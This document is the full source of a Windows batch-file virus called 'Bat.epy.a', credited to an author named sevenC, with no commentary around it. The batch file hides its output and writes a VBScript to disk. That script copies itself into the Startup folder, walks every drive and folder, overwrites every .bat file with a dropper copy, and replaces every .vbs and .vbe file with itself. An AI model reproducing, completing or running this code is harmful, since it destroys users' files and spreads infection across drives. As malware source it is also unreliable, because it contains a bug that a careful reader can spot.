:: Bat.epy.a
:: By sevenC [ http://sevenc.vze.com]
@ctty nul
@echo off
@echo Set Fso = createobject("scripting.filesystemobject")>>C:\fuck.vbs
@echo.On error resume next>>C:\fuck.vbs
@echo Fso.copyfile wscript.scriptfullname, "C:\WINDOWS\Start Menu\Programs\StartUp\system7.vbs">>C:\fuck.vbs
@echo Set Drives=fso.drives >>C:\fuck.vbs
@echo For Each Drive in Drives>>C:\fuck.vbs
@echo If drive.isready then>>C:\fuck.vbs
@echo Cari drive>>C:\fuck.vbs
@echo end If>>C:\fuck.vbs
@echo next>>C:\fuck.vbs
@echo Sub Cari(FIL)>>C:\fuck.vbs
@echo On Error Resume Next>>C:\fuck.vbs
@echo Set Rusak = FSO.GetFolder(FIL)>>C:\fuck.vbs
@echo For Each Kacau In Rusak.Files>>C:\fuck.vbs
@echo If fso.GetExtensionName(Kacau.path)="bat" then>>C:\fuck.vbs
@echo Set cop = Fso.OpenTextFile("C:\windows\system7.bat",true)>>C:\fuck.vbs
@echo dropper = cop.readall>>C:\fuck.vbs
@echo dropper.close>>C:\fuck.vbs
@echo Set droper = Fso.createtextfile(Kacau.path, True)>>C:\fuck.vbs
@echo droper.write dropper>>C:\fuck.vbs
@echo droper.Close>>C:\fuck.vbs
@echo end if>>C:\fuck.vbs
@echo If fso.GetExtensionName(Kacau.path)="vbs" or fso.GetExtensionName(Kacau.path)="vbe" then>>C:\fuck.vbs
@echo fso.copyfile wscript.scriptfullname,Kacau.path>>C:\fuck.vbs
@echo end if>>C:\fuck.vbs
@echo Next>>C:\fuck.vbs
@echo For Each Lagi In Rusak.SubFolders>>C:\fuck.vbs
@echo Cari(Lagi.Path)>>C:\fuck.vbs
@echo Next>>C:\fuck.vbs
@echo End Sub>>C:\fuck.vbs
